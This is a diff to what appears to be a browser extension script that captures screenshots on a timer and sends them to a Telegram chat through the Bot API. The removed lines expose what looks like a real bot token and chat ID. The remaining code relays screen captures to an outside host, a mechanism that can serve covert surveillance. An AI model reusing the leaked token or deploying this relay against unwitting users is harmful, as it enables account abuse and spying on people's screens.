@@ -35,29 +35,32 @@ function dataURItoBlob(dataURI) {
   chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
     if (request.action == "sendScreenshot") {
 
-      const botToken = '6534971826:AAGHG912jrpBr9S5BeYs17jO1jajSTq3qR8';
-      const chatId = '1350746482'; // Replace with the actual chat ID
-  
-      // Convert data URL to Blob
-      const blob = dataURItoBlob(request.screenshotUrl);
-  
-      // Create a FormData object to send the file
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'screenshot.png');
-  
-      // Make the HTTP request to the Telegram Bot API
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData,
-      })
-        .then(response => response.json())
-        .then(responseText => {
-          console.log('Telegram API response:', responseText);
+      // Never commit a Telegram token or a recipient identifier to a public repository.
+      // Configuration is deliberately local to the user's extension profile.
+      chrome.storage.local.get(['telegramBotToken', 'telegramChatId'], function (settings) {
+        const botToken = settings.telegramBotToken;
+        const chatId = settings.telegramChatId;
+        if (!botToken || !chatId) {
+          console.warn('Telegram delivery disabled until credentials are configured.');
+          return;
+        }
+
+        const blob = dataURItoBlob(request.screenshotUrl);
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'screenshot.png');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
         })
-        .catch(error => {
-          console.error('Error sending screenshot to Telegram:', error);
-        });
+          .then(function (response) {
+            if (!response.ok) throw new Error('Telegram delivery failed (' + response.status + ')');
+          })
+          .catch(function (error) {
+            console.error('Screenshot delivery failed:', error.message);
+          });
+      });
     } else if (request.action == "captureAndSend") {
       setTimeout(runtheprogram, 8000); // Start the first screenshot capture
     }
